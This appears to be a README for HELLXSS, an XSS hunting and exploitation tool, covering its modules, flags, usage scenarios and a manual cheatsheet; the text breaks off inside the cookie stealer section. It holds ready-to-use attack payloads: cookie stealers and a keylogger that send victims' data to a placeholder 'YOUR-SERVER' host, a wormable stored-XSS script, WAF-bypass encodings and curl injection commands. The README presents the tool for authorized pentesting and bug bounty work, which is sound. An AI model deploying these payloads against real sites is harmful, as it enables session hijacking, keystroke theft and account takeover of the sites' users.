<div align="center">

```
██╗  ██╗███████╗██╗     ██╗       ██╗  ██╗███████╗███████╗
██║  ██║██╔════╝██║     ██║       ╚██╗██╔╝██╔════╝██╔════╝
███████║█████╗  ██║     ██║        ╚███╔╝ ███████╗███████╗
██╔══██║██╔══╝  ██║     ██║        ██╔██╗ ╚════██║╚════██║
██║  ██║███████╗███████╗███████╗  ██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝  ╚═╝  ╚═╝╚══════╝╚══════╝

        v 1 . 0   U L T R A  —  M A D E   I N   H E L L
```

# 🔥 HELLXSS v1.0 ULTRA

### The World's Most Powerful XSS Hunter & Automation Framework

### *"Give it a URL. Walk away. Come back to every XSS on the target."*

<br>

[![Author](https://img.shields.io/badge/Author-RAJESH%20BAJIYA-ff2d55?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hellrider978)
[![Handle](https://img.shields.io/badge/Handle-HACKEROFHELL-bf5af2?style=for-the-badge&logo=hackaday&logoColor=white)](https://github.com/hellrider978)
[![GitHub](https://img.shields.io/badge/GitHub-hellrider978-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hellrider978/hellxss)
[![Version](https://img.shields.io/badge/Version-1.0%20ULTRA-00d4ff?style=for-the-badge)](https://github.com/hellrider978/hellxss)
[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org)
[![License](https://img.shields.io/badge/License-MIT-39ff14?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hellrider978/hellxss?style=for-the-badge&color=ffd60a&label=⭐%20Stars)](https://github.com/hellrider978/hellxss)

<br>

```
╔════════════════════════════════════════════════════════════════════════╗
║                                                                        ║
║   2047 LINES  ·  13 XSS MODULES  ·  200+ PAYLOADS  ·  PURE PYTHON   ║
║   ONE COMMAND  →  FULL AUTO CRAWL  →  FIND ALL XSS  →  REPORT       ║
║                                                                        ║
║   Reflected · Stored · DOM · Blind · Header · JSON/API              ║
║   Template Injection · Upload XSS · Prototype Pollution · mXSS      ║
║   Polyglot · Context-Aware · WAF Bypass · CSP Analysis              ║
║   Cookie Stealer PoC · Keylogger Payload · Full Exploit in Report   ║
║                                                                        ║
╚════════════════════════════════════════════════════════════════════════╝
```

<br>

> **✍️ Built by RAJESH BAJIYA**
> **🔥 Handle: HACKEROFHELL**
> **🐙 GitHub: [hellrider978](https://github.com/hellrider978)**

</div>

---

## ⚠️ LEGAL DISCLAIMER

```
╔══════════════════════════════════════════════════════════════════════════╗
║                          !! IMPORTANT !!                                 ║
║                                                                          ║
║  HELLXSS is for AUTHORIZED testing ONLY:                                ║
║    · Systems you personally OWN                                          ║
║    · Systems with EXPLICIT WRITTEN permission to test                    ║
║    · Authorized bug bounty programs (HackerOne/Bugcrowd/etc.)           ║
║                                                                          ║
║  RAJESH BAJIYA / HACKEROFHELL / hellrider978 takes ZERO liability.      ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 📋 TABLE OF CONTENTS

| # | Section |
|---|---------|
| 01 | [What is HELLXSS?](#-what-is-hellxss) |
| 02 | [How It Works — One Command](#-how-it-works--one-command) |
| 03 | [Full Feature List](#-full-feature-list) |
| 04 | [All 13 XSS Modules](#-all-13-xss-modules) |
| 05 | [200+ Payload Library](#-200-payload-library) |
| 06 | [Requirements & Installation](#-requirements--installation) |
| 07 | [All CLI Flags](#-all-cli-flags) |
| 08 | [Usage — Every Scenario](#-usage--every-scenario) |
| **09** | **[⚡ HOW TO SKIP MODULES](#-how-to-skip-modules)** |
| 10 | [Output Files](#-output-files) |
| 11 | [Reading the HTML Report](#-reading-the-html-report) |
| 12 | [Manual XSS Cheatsheet](#-manual-xss-cheatsheet) |
| 13 | [Troubleshooting](#-troubleshooting) |
| 14 | [Author](#-author) |

---

## 🔥 What is HELLXSS?

**HELLXSS** is the world's most complete automated XSS hunter. Built in pure Python 3 by **RAJESH BAJIYA (HACKEROFHELL / hellrider978)**.

You give it **one URL**. It automatically finds:
- **Reflected XSS** — in every GET parameter, POST form field, path segment
- **Stored XSS** — in comments, profiles, forms, any persistent input
- **DOM XSS** — by analyzing JavaScript sources and sinks
- **Blind XSS** — with out-of-band callbacks, cookie stealers, keyloggers
- **Header XSS** — User-Agent, Referer, X-Forwarded-For, and 6 more headers
- **JSON/API XSS** — REST endpoints, JSON body injection
- **Template Injection → XSS** — Angular, Vue, Jinja2, Twig, Handlebars
- **Upload XSS** — SVG, HTML, XML file upload vectors
- **Prototype Pollution → XSS** — `__proto__` to DOM injection
- **Polyglot XSS** — payloads that work in multiple contexts at once
- **mXSS** — mutation-based browser XSS

And the report includes the **full payload library** — every payload tested — so you can copy and use them manually too.

---

## ⚙️ How It Works — One Command

```bash
python3 hellxss.py -t https://target.com
```

**Completely automatic:**
1. Crawls every page, discovers every form, JS endpoint, and parameter
2. Mines historical URLs from Wayback Machine
3. Analyzes JavaScript files for DOM sinks and sources
4. Tests every injection point with context-aware payloads
5. Detects the HTML/JS/attribute/URL context and uses the right payloads
6. Confirms every finding before saving — zero false positives
7. Generates HTML report with PoC, cookie stealer payload, and full payload library

---

## ✨ Full Feature List

```
┌──────────────────────────────────────────────────────────────────────┐
│              HELLXSS v1.0 ULTRA — COMPLETE FEATURES                  │
├──────────────────────────────────────────────────────────────────────┤
│  INTELLIGENCE                                                         │
│  ✔  Full target crawl with configurable depth                        │
│  ✔  Historical URL mining (Wayback Machine)                          │
│  ✔  Form discovery (GET/POST, hidden fields)                         │
│  ✔  File upload form detection                                       │
│  ✔  Login form identification                                        │
│  ✔  JavaScript endpoint extraction                                   │
│  ✔  API endpoint discovery                                           │
│                                                                       │
│  XSS TECHNIQUES (13 Modules)                                         │
│  ✔  Reflected XSS (GET params + POST forms)                         │
│  ✔  Stored/Persistent XSS (any stored input)                        │
│  ✔  DOM XSS (source→sink flow analysis)                             │
│  ✔  Blind XSS (out-of-band, cookie stealer, keylogger)              │
│  ✔  Header XSS (8 HTTP headers tested)                              │
│  ✔  JSON/API XSS (REST + GraphQL body injection)                    │
│  ✔  Template Injection → XSS (6 template engines)                  │
│  ✔  File Upload XSS (SVG, HTML, XML, PHP bypass)                   │
│  ✔  CSP Analysis + bypass detection                                 │
│  ✔  Prototype Pollution → XSS                                       │
│  ✔  Polyglot XSS (multi-context payloads)                          │
│  ✔  mXSS (Mutation XSS browser quirks)                             │
│  ✔  DOM Clobbering                                                  │
│                                                                       │
│  CONTEXT-AWARE PAYLOADS                                               │
│  ✔  Auto-detects HTML context (body/attr/js/url/css/comment)        │
│  ✔  Selects optimal payloads per context                            │
│  ✔  Attribute breakout payloads (single+double quote)               │
│  ✔  JavaScript context breakout                                     │
│  ✔  URL attribute (href/src/action) payloads                        │
│  ✔  CSS context escape                                              │
│                                                                       │
│  WAF BYPASS                                                           │
│  ✔  50+ bypass encoding techniques                                  │
│  ✔  Case mixing, comment injection, null bytes                      │
│  ✔  Unicode normalization, HTML entity encoding                     │
│  ✔  Double/triple URL encoding                                      │
│  ✔  Tab/newline space replacement                                   │
│  ✔  SVG/math/noscript tag smuggling                                 │
│                                                                       │
│  PAYLOAD LIBRARY (200+)                                               │
│  ✔  Basic payloads (20)                                             │
│  ✔  Event handler payloads (18)                                     │
│  ✔  WAF bypass payloads (50+)                                       │
│  ✔  Attribute context (17)                                          │
│  ✔  JavaScript context (14)                                         │
│  ✔  URL context (8)                                                 │
│  ✔  Polyglot payloads (6)                                           │
│  ✔  Blind XSS callback (12)                                         │
│  ✔  Template-specific (6 engines × 3-4 payloads)                   │
│  ✔  mXSS (8)                                                        │
│  ✔  CSP bypass (6)                                                  │
│  ✔  SVG/XML vectors (4)                                             │
│  ✔  Full cookie stealer exploit payload                             │
│  ✔  Keylogger payload                                               │
│                                                                       │
│  ADVANCED                                                             │
│  ✔  Multi-threaded (configurable 1-50 threads)                      │
│  ✔  Burp Suite proxy integration                                    │
│  ✔  Session cookie support                                          │
│  ✔  Bearer token / Basic auth                                       │
│  ✔  Random User-Agent rotation                                      │
│  ✔  Discord/Slack webhook notifications                             │
│  ✔  Ctrl+C safe (partial report on interrupt)                      │
│                                                                       │
│  REPORTING                                                            │
│  ✔  Professional dark-theme HTML report                             │
│  ✔  CVSS score per finding                                          │
│  ✔  Copy PoC button (one click)                                     │
│  ✔  Copy Payload button (one click)                                 │
│  ✔  Cookie stealer + keylogger payload per finding                 │
│  ✔  Full payload library embedded in report                        │
│  ✔  findings JSON for programmatic use                              │
│  ✔  RAJESH BAJIYA / HACKEROFHELL fingerprint                       │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 🧩 All 13 XSS Modules

### Module 01 — Target Intelligence & Crawling

Discovers every injectable point automatically.

```
Discovers:
  ✔  Every page (recursive crawl, configurable depth)
  ✔  All GET parameters (?q=test&id=1&page=2)
  ✔  All POST forms (hidden fields included)
  ✔  File upload forms (for SVG/HTML upload XSS)
  ✔  Login forms (identified automatically)
  ✔  Historical URLs (Wayback Machine, up to 3000 URLs)
  ✔  JavaScript endpoints (fetch/axios/url/path extraction)
  ✔  API endpoints (/api/, /rest/, /v1/, .json)
```

---

### Module 03 — Reflected XSS

The core reflected XSS hunter with context detection.

```
Method:
  Step 1: Inject unique marker into each parameter
  Step 2: Detect if marker is reflected
  Step 3: Analyze context (html_body / javascript / attr_" / attr_' / url_attr / css / textarea)
  Step 4: Select optimal payloads for detected context
  Step 5: Inject and confirm XSS fires (unescaped in response)

Payloads per context:
  html_body:   Basic + Event handlers + WAF bypass
  javascript:  JS context breakout (';alert(1)// etc.)
  attr_":      Attribute breakout (double quote escape)
  attr_':      Attribute breakout (single quote escape)
  url_attr:    javascript: / data: / vbscript: URIs
  css:         </style><script> escape
  textarea:    </textarea><script> escape

WAF bypass: URL encode, double encode, case mix, comment inject
```

---

### Module 04 — Stored XSS

```
Tests: All POST forms across entire target
Payloads: 12 stored XSS payloads
Detection: After submission, visits 8 likely display pages
Checks: /comments, /posts, /reviews, /profile, /dashboard, original form page

Wormable payload included in PoC:
  <script>var x=new XMLHttpRequest();x.open('POST','/form',false);
  x.send('{field}='+encodeURIComponent(document.scripts[0].innerText));
  x.send();</script>
```

---

### Module 05 — DOM XSS Analysis

```
Method: Static analysis of JavaScript source code
Analyzes: All collected JS files + inline scripts on every page

Sources checked (14):
  location.search    location.hash     location.href
  document.URL       document.referrer document.cookie
  window.name        history.pushState postMessage
  localStorage       sessionStorage    URLSearchParams
  querystring        history.replaceState

Sinks checked (28):
  document.write     innerHTML         outerHTML
  insertAdjacentHTML eval              setTimeout
  setInterval        new Function      location=
  location.href=     location.assign   location.replace
  document.domain=   .src=             .href=
  window.open        jQuery("<")       $.("<")
  .html(            .append(          .prepend(
  .after(           .before(          .replaceWith(
  dangerouslySetInnerHTML              v-html=
  [innerHTML]=
```

---

### Module 06 — Blind XSS

```
Payloads: 12 blind XSS callback templates + 1 full exploit
Callback includes: Cookie value, URL, title, user-agent, localStorage, sessionStorage

Full exploit payload does:
  1. Steals all cookies
  2. Sends to your server: /hellxss/steal?d=base64(all_data)
  3. Keylogger: captures every keystroke → /hellxss/keys?k=base64(keys)

Setup options:
  --blind-url https://your-server.com    Your own server
  https://xsshunter.trufflesecurity.com  Free blind XSS service

Fires when payload is:
  · Stored in admin panel → viewed by admin
  · Logged in server logs → viewed in log viewer
  · Stored in support ticket → viewed by support agent
  · Stored in user profile → viewed by moderator
```

---

### Module 07 — Header XSS

```
Headers tested (8):
  User-Agent          Referer
  X-Forwarded-For     X-Real-IP
  X-Forwarded-Host    Accept-Language
  Origin              X-Custom-IP

Techniques: Error-based reflection + time-based (if applicable)
```

---

### Module 08 — JSON/API XSS

```
Tests:
  · GET requests with XSS in query params (q, search, name, id)
  · POST JSON body (name, username, email, query, search, message, comment)

Checks: Whether XSS payload is reflected in HTML or JSON response
Note: JSON response XSS fires when frontend renders without escaping
```

---

### Module 09 — Template Injection → XSS

```
Detection: {{7*7}} → 49 confirms template execution

Engines and payloads:
  Angular:    {{constructor.constructor("alert(1)")()}}
  Vue:        {{constructor.constructor("alert(1)")()}}
  React:      dangerouslySetInnerHTML
  Handlebars: Full prototype chain exploit
  Jinja2:     {{config.items()}} then XSS escalation
  Twig:       _self.env.registerUndefinedFilterCallback
  Generic:    ${alert(1)}, #{alert(1)}, <%= alert(1)%>

Escalation: Template injection → RCE (Jinja2/Twig) also noted in PoC
```

---

### Module 10 — File Upload XSS

```
Files tested:
  hellxss.svg    → SVG with <script>alert()</script> + onload handler
  hellxss.html   → HTML page with body onload + inline script
  hellxss.xml    → XML with JavaScript entity
  hellxss.php    → Disguised as image/jpeg, contains XSS
  test.jpg       → JPEG magic bytes + XSS payload (polyglot)

Detection: After upload, checks response for reflected path, then fetches uploaded URL
```

---

### Module 11 — CSP Analysis

```
Detects:
  ✔  Missing CSP header (XSS has maximum impact)
  ✔  unsafe-inline in script-src (inline script bypass)
  ✔  unsafe-eval (eval-based XSS possible)
  ✔  Wildcard (*) in script-src (any script loadable)
  ✔  data: URI allowed (data: XSS vectors usable)
  ✔  CDN domains with JSONP endpoints (bypass via JSONP)
  ✔  No nonce/strict-dynamic (hash bypass possible)
```

---

### Module 12 — Prototype Pollution → XSS

```
Tests: 3 prototype pollution patterns
  ?__proto__[innerHTML]=<img+src=x+onerror=alert(1)>
  ?constructor[prototype][innerHTML]=<img+src=x+onerror=alert(1)>
  ?__proto__[src]=1&__proto__[onerror]=alert(1)

Confirms: If XSS payload appears in response body = exploitable
```

---

### Module 13 — Polyglot + mXSS

```
Polyglot payloads: Work in HTML body + JS context + attribute + URL simultaneously
mXSS payloads: Browser mutation-based — work after HTML parsing transforms content
DOM Clobbering: id/name attribute overwrite attacks
```

---

## 📋 200+ Payload Library

The report embeds the **entire payload library** so you can copy any payload manually.

### Quick Reference

```html
<!-- Basic -->
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- Attribute Breakout -->
" onmouseover="alert(1)"
' onfocus='alert(1)' autofocus='
"><img src=x onerror=alert(1)>

<!-- JavaScript Context -->
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
`; alert(1); //`

<!-- WAF Bypass -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg\tonload=alert(1)>
<svg/onload=alert`1`>
<iframe srcdoc="<script>alert(1)</script>">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )

<!-- Blind XSS -->
<script src="https://YOUR-SERVER/hellxss/PAYLOAD_ID"></script>
"><img src=x onerror="fetch('https://YOUR-SERVER/steal?c='+document.cookie)">

<!-- Cookie Stealer (full) -->
<script>fetch('https://YOUR-SERVER/steal?d='+btoa(JSON.stringify({cookie:document.cookie,url:location.href})))</script>

<!-- Keylogger -->
<script>document.addEventListener('keydown',function(e){fetch('https://YOUR-SERVER/keys?k='+btoa(e.key))})</script>
```

---

## 📦 Requirements & Installation

### Install in 60 seconds

```bash
# Clone from GitHub
git clone https://github.com/hellrider978/hellxss.git
cd hellxss

# Install dependencies
pip3 install requests beautifulsoup4 --break-system-packages

# Make executable
chmod +x hellxss.py

# Test on known vulnerable target
python3 hellxss.py -t https://testphp.vulnweb.com
```

### Manual (copy-paste method)

```bash
mkdir ~/hellxss && cd ~/hellxss
nano hellxss.py
# → Paste code → Ctrl+X → Y → Enter
chmod +x hellxss.py
pip3 install requests beautifulsoup4 --break-system-packages
python3 hellxss.py -t https://target.com
```

### Verify

```bash
python3 hellxss.py --help
# Should show HELLXSS banner + all flags
```

---

## 🎛️ All CLI Flags

```
╔══════════════════════════════════════════════════════════════════════╗
║              HELLXSS v1.0 ULTRA — ALL FLAGS                          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  TARGET (required):                                                  ║
║    -t, --target    https://target.com    URL, domain, or IP          ║
║    -u, --url       Test a specific URL with params                   ║
║    -f, --url-file  File with list of URLs (one per line)            ║
║                                                                      ║
║  OUTPUT:                                                             ║
║    -o, --output    ~/hellxss_output    Output directory              ║
║                                                                      ║
║  AUTH / SESSION:                                                     ║
║    --cookie   "PHPSESSID=abc;token=xyz"    Session cookies          ║
║    --headers  "Authorization: Bearer TOKEN"   Custom headers        ║
║    --token    "YOUR_JWT"                   Bearer token             ║
║    --auth     "user:pass"                  HTTP Basic auth          ║
║                                                                      ║
║  PROXY:                                                              ║
║    -p, --proxy    http://127.0.0.1:8080    Burp Suite               ║
║                                                                      ║
║  SCAN DEPTH:                                                         ║
║    --crawl          Enable deep crawling (default: smart crawl)     ║
║    --deep           Max depth + all techniques                      ║
║    --ultra          EVERYTHING: crawl+deep+waf-bypass+level3       ║
║    --level  1|2|3   Payload depth  1=fast  2=normal  3=thorough    ║
║                                                                      ║
║  BLIND XSS:                                                          ║
║    --blind-url  https://your-server.com    Callback server          ║
║                 (or use https://xsshunter.trufflesecurity.com)      ║
║                                                                      ║
║  SPEED:                                                              ║
║    --threads  10    Thread count (default: 10)                      ║
║    --timeout  15    Request timeout seconds                         ║
║    --delay    0     Seconds between requests                        ║
║                                                                      ║
║  BYPASS:                                                             ║
║    --waf-bypass     Enable WAF bypass encoding techniques           ║
║    --random-agent   Rotate User-Agent per request                   ║
║    --user-agent ""  Set custom User-Agent                           ║
║                                                                      ║
║  SKIP FLAGS (see Section 09):                                       ║
║    --skip-crawl     Skip Module 01 crawling                        ║
║    --skip-stored    Skip Module 04 (stored XSS)                    ║
║    --skip-dom       Skip Module 05 (DOM XSS)                       ║
║    --skip-blind     Skip Module 06 (blind XSS)                     ║
║    --skip-headers   Skip Module 07 (header XSS)                    ║
║    --skip-template  Skip Module 09 (template injection)            ║
║    --skip-modules   1,5,6   Skip any module by number              ║
║                                                                      ║
║  NOTIFICATIONS:                                                      ║
║    --webhook  https://hooks.slack.com/...   Slack/Discord          ║
║                                                                      ║
║  MISC:                                                               ║
║    --verify-ssl    Enable SSL verification                          ║
║    --silent        Suppress non-finding output                      ║
║    -h, --help      Show help                                         ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## 💻 Usage — Every Scenario

### ── The One Command You Need ──

```bash
python3 hellxss.py -t https://target.com
```

---

### Standard Scans

```bash
# Basic — auto everything
python3 hellxss.py -t https://target.com

# Domain only (auto https://)
python3 hellxss.py -t target.com

# Deep crawl + all techniques
python3 hellxss.py -t https://target.com --crawl --deep

# Maximum power (ultra mode)
python3 hellxss.py -t https://target.com --ultra

# Test specific URL with known parameter
python3 hellxss.py -t https://target.com -u "https://target.com/search?q=test"

# Test list of URLs from file
python3 hellxss.py -t https://target.com -f urls.txt
```

---

### With Session Auth

```bash
# Cookie from browser DevTools
python3 hellxss.py -t https://target.com \
  --cookie "PHPSESSID=abc123;_session=xyz789"

# JWT Bearer token
python3 hellxss.py -t https://target.com \
  --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Multiple custom headers
python3 hellxss.py -t https://target.com \
  --headers "Authorization: Bearer TOKEN" \
  --cookie "session=abc123"
```

---

### Blind XSS (Most Powerful)

```bash
# With your own server
python3 hellxss.py -t https://target.com \
  --blind-url https://your-server.com

# With XSS Hunter (free service)
python3 hellxss.py -t https://target.com \
  --blind-url https://xsshunter.trufflesecurity.com

# Blind XSS + deep scan
python3 hellxss.py -t https://target.com \
  --blind-url https://your-server.com --ultra

# Set up your listener:
python3 -m http.server 8888
# Then use: --blind-url http://YOUR_IP:8888
```

---

### WAF Bypass Mode

```bash
# Enable all WAF bypass encodings
python3 hellxss.py -t https://target.com --waf-bypass

# Rotate User-Agent + WAF bypass
python3 hellxss.py -t https://target.com \
  --waf-bypass --random-agent

# Stealth + bypass
python3 hellxss.py -t https://target.com \
  --waf-bypass --random-agent --delay 1 --rate 20
```

---

### Proxy Through Burp Suite

```bash
# Route all requests through Burp
python3 hellxss.py -t https://target.com \
  -p http://127.0.0.1:8080

# Burp + all features
python3 hellxss.py -t https://target.com \
  -p http://127.0.0.1:8080 --ultra
```

---

### API / JSON Testing Focus

```bash
# API mode
python3 hellxss.py -t https://target.com/api \
  --skip-modules 4,10 --threads 5
```

---

### Discord/Slack Notifications

```bash
# Alert on each XSS found
python3 hellxss.py -t https://target.com \
  --webhook "https://hooks.slack.com/services/T000/B000/xxxx"

python3 hellxss.py -t https://target.com \
  --webhook "https://discord.com/api/webhooks/YOUR_ID/TOKEN"
```

---

### Full Power Scan

```bash
python3 hellxss.py \
  -t https://target.com \
  -o ~/pentests/target_xss \
  --ultra \
  --blind-url https://your-server.com \
  --waf-bypass \
  --random-agent \
  --threads 15 \
  --level 3 \
  -p http://127.0.0.1:8080 \
  --webhook "https://hooks.slack.com/YOUR/WEBHOOK" \
  --cookie "session=YOUR_COOKIE"
```

---

## ⚡ HOW TO SKIP MODULES

> **Full guide on controlling which XSS techniques run.**

---

### Method 1 — Built-in Skip Flags (Easiest)

```bash
# Skip DOM XSS analysis (Module 05) — can be slow on large JS codebases
python3 hellxss.py -t https://target.com --skip-dom

# Skip blind XSS (Module 06) — only useful when you have a callback server
python3 hellxss.py -t https://target.com --skip-blind

# Skip stored XSS (Module 04) — skip if target has no persistent storage
python3 hellxss.py -t https://target.com --skip-stored

# Skip header XSS (Module 07)
python3 hellxss.py -t https://target.com --skip-headers

# Skip template injection (Module 09)
python3 hellxss.py -t https://target.com --skip-template

# Skip crawling — only test exact URL you give
python3 hellxss.py -t https://target.com/search?q=test --skip-crawl
```

---

### Method 2 — Skip by Module Number

```bash
# Skip specific modules by number
python3 hellxss.py -t https://target.com --skip-modules 5,6,10

# Skip multiple
python3 hellxss.py -t https://target.com --skip-modules 4,5,6,9,10,12,13

# Skip heavy/slow modules for fast first-pass
python3 hellxss.py -t https://target.com --skip-modules 4,5,6,10,12,13
```

---

### Module Number Reference

| Module # | Name | When to SKIP it |
|----------|------|----------------|
| 1 | Intelligence & Crawling | You have URL list → `-f urls.txt --skip-crawl` |
| 3 | Reflected XSS | Never skip — this is the core module |
| 4 | Stored XSS | Target has no persistent storage |
| 5 | DOM XSS | No JS or already reviewed manually — slow on large JS |
| 6 | Blind XSS | No callback server available, or not testing admin panels |
| 7 | Header XSS | Headers not logged/stored by app |
| 8 | JSON/API XSS | No API endpoints on target |
| 9 | Template Injection | Target not using template engines |
| 10 | Upload XSS | No file upload functionality on target |
| 11 | CSP Analysis | Already reviewed CSP manually |
| 12 | Prototype Pollution | Target not a JavaScript-heavy SPA |
| 13 | Polyglot XSS | Already covered by Module 3 results |
| 20 | Report | **NEVER SKIP** |

---

### Common Skip Scenarios

```bash
# === SCENARIO: Quick reflected XSS check only ===
python3 hellxss.py -t https://target.com \
  --skip-modules 4,5,6,7,8,9,10,11,12,13

# === SCENARIO: I have my URL list, skip crawling ===
python3 hellxss.py -t https://target.com \
  -f my_urls.txt --skip-crawl

# === SCENARIO: Only DOM XSS analysis ===
python3 hellxss.py -t https://target.com \
  --skip-modules 3,4,6,7,8,9,10,11,12,13

# === SCENARIO: Only blind XSS injection (no confirmation needed) ===
python3 hellxss.py -t https://target.com \
  --blind-url https://your-server.com \
  --skip-modules 3,4,5,7,8,9,10,11,12,13

# === SCENARIO: API focus only ===
python3 hellxss.py -t https://target.com/api \
  --skip-modules 4,5,6,9,10,11,12,13

# === SCENARIO: Fast first-pass ===
python3 hellxss.py -t https://target.com \
  --skip-modules 4,5,6,9,10,12,13 --level 1

# === SCENARIO: Hardened target, WAF bypass needed ===
python3 hellxss.py -t https://target.com \
  --waf-bypass --random-agent --level 3 \
  --skip-modules 4,5,6,10

# === SCENARIO: Only check for CSP issues (fastest possible) ===
python3 hellxss.py -t https://target.com \
  --skip-modules 3,4,5,6,7,8,9,10,12,13
```

---

### Speed Comparison

| Combination | Speed | Best For |
|------------|-------|---------|
| `--ultra` | 🐢 Slowest | Full audit |
| Default | 🚶 Normal | Standard bug bounty |
| `--skip-modules 4,5,6,10` | 🐇 Fast | Quick initial check |
| `--skip-modules 4,5,6,9,10,12,13 --level 1` | ⚡ Fastest | Rapid triage |
| `--skip-crawl -u URL` | ⚡⚡ Instant | Single known parameter |

---

## 📁 Output Files

```
~/hellxss_output/
└── target.com/
    │
    ├── HELLXSS_target.com_20241025_143022.html   ← OPEN THIS (main report)
    │
    ├── hellxss_findings.json                     ← Machine-readable findings
    │   {
    │     "target": "https://target.com",
    │     "author": "RAJESH BAJIYA",
    │     "handle": "HACKEROFHELL",
    │     "tool": "HELLXSS v1.0 ULTRA",
    │     "findings": [
    │       {
    │         "title": "Reflected XSS — Context: html_body",
    │         "type": "reflected",
    │         "severity": "HIGH",
    │         "cvss": "7.4",
    │         "url": "https://target.com/search?q=test",
    │         "parameter": "q",
    │         "payload": "<img src=x onerror=alert(1)>",
    │         "context": "html_body",
    │         "poc": "...",
    │         "remediation": "..."
    │       }
    │     ]
    │   }
    │
    ├── summary.txt                               ← Quick text summary
    │
    ├── js_XXXXXXXX.txt                           ← Extracted JS file contents
    │   (one per discovered JS file, used for DOM analysis)
    │
    └── blind_xss_injected.txt                    ← Blind XSS injection log
        (if blind XSS module ran)
        HELLXSS Blind XSS Injection Log
        Callback URL: https://your-server.com
        Unique ID: blind_ABCD1234
        Injected: 247 times
        Check: https://your-server.com/hellxss/blind_ABCD1234
```

---

## 📊 Reading the HTML Report

```bash
# Open the report
firefox ~/hellxss_output/target.com/HELLXSS_*.html

# Auto-find and open
find ~/hellxss_output -name "HELLXSS_*.html" | xargs firefox
```

**What's in the report:**

```
┌──────────────────────────────────────────────────────────────────┐
│  HELLXSS ASCII ART BANNER                                        │
│  XSS VULNERABILITY AUDIT REPORT                                  │
│  RAJESH BAJIYA | HACKEROFHELL | hellrider978 | CONFIDENTIAL     │
│                                                    Risk Score    │
├────────────────────┬──────────────────┬──────────────────────────┤
│ Severity Chart     │ Statistics       │ XSS Types Found          │
│ HIGH    █████      │ Total:    7       │ reflected                │
│ MEDIUM  ██         │ High:     5       │ dom                     │
│                    │ Medium:   2       │ stored                  │
├────────────────────┴──────────────────┴──────────────────────────┤
│ 🔥 CONFIRMED XSS FINDINGS                                        │
│                                                                  │
│ ┌──────────────────────────────────────────────────────────┐    │
│ │ [HIGH] CVSS 7.4  ⚡ REFLECTED  html_body          ▼      │    │
│ │  URL:       https://target.com/search?q=test            │    │
│ │  Parameter: q                                            │    │
│ │  Context:   html_body                                    │    │
│ │  Payload:   <img src=x onerror=alert(1)>                │    │
│ │  Evidence:  Payload reflected unescaped                  │    │
│ │  PoC:  curl 'URL' | ... [⎘ COPY PoC] [📋 COPY PAYLOAD] │    │
│ │  Fix:  HTML-encode output. Implement CSP.               │    │
│ └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│ 📋 XSS PAYLOAD LIBRARY — All 200+ Payloads Tested               │
│ Basic · Event Handlers · WAF Bypass · Polyglot · Blind XSS...  │
└──────────────────────────────────────────────────────────────────┘
```

**Each finding has TWO copy buttons:**
- `⎘ COPY PoC` — copies the full curl/exploit command
- `📋 COPY PAYLOAD` — copies just the XSS payload for manual use

---

## 📖 Manual XSS Cheatsheet

Quick reference for manual testing.

### Basic Detection

```bash
# Inject and check response
curl -sk "https://target.com/search?q=<script>alert(1)</script>" | grep -i "<script>alert"
curl -sk "https://target.com/search?q=HELLXSS_TEST" | grep "HELLXSS_TEST"

# Check if reflected unescaped
curl -sk "https://target.com/page?q=<HELLXSS>" | grep -v "&lt;HELLXSS&gt;" | grep "HELLXSS"
```

### Context Detection

```bash
# Inject marker, check surrounding HTML context
curl -sk "https://target.com/search?q=HELLXSS_MARKER" | grep -A2 -B2 "HELLXSS_MARKER"

# If marker appears inside <script>: use JS context payloads
# If marker appears in href="...": use javascript: payloads
# If marker appears in value="...": use " onmouseover=alert(1) " payloads
# If marker appears in raw HTML: use <img src=x onerror=alert(1)>
```

### Testing All Contexts

```bash
BASE="https://target.com/search"

# HTML body context
curl -sk "$BASE?q=<img src=x onerror=alert(1)>"

# Attribute context (double quote)
curl -sk "$BASE?q=\" onmouseover=\"alert(1)\""

# Attribute context (single quote)
curl -sk "$BASE?q=' onmouseover='alert(1)'"

# JavaScript context
curl -sk "$BASE?q=';alert(1)//"

# URL context (href/src)
curl -sk "$BASE?redirect=javascript:alert(1)"

# HTML tag context
curl -sk "$BASE?q= onmouseover=alert(1)//"
```

### WAF Bypass

```bash
# Case mixing
curl -sk "$BASE?q=<ScRiPt>alert(1)</ScRiPt>"

# Comment injection
curl -sk "$BASE?q=<scr/**/ipt>alert(1)</scr/**/ipt>"

# URL encoding
curl -sk "$BASE?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

# Double encoding
curl -sk "$BASE?q=%253Cscript%253Ealert(1)%253C/script%253E"

# Entity encoding
curl -sk "$BASE?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"

# SVG/math smuggling
curl -sk "$BASE?q=<svg onload=alert(1)>"
curl -sk "$BASE?q=<svg\tonload=alert(1)>"
curl -sk "$BASE?q=<details open ontoggle=alert(1)>"

# Template literal
curl -sk "$BASE?q=<img src=x onerror=alert\`1\`>"
```

### Cookie Stealer Payloads

```bash
# Redirect to attacker site with cookie
<script>document.location='https://YOUR-SERVER/?c='+document.cookie</script>

# Image beacon
<img src="https://YOUR-SERVER/steal?c=" onerror="this.src='https://YOUR-SERVER/steal?c='+document.cookie">

# Fetch API
<script>fetch('https://YOUR-SERVER/steal?c='+document.cookie)</script>

# XHR
